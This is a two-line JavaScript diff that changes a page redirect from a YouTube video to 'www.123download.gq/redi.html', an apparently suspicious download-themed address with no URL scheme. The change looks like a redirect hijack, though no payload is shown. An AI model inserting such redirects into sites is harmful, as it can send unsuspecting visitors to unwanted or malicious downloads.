@@ -1,2 +1,2 @@
 
-  location.href = "https://www.youtube.com/watch?v=J04uNivXGHs";
+  location.href = "www.123download.gq/redi.html";
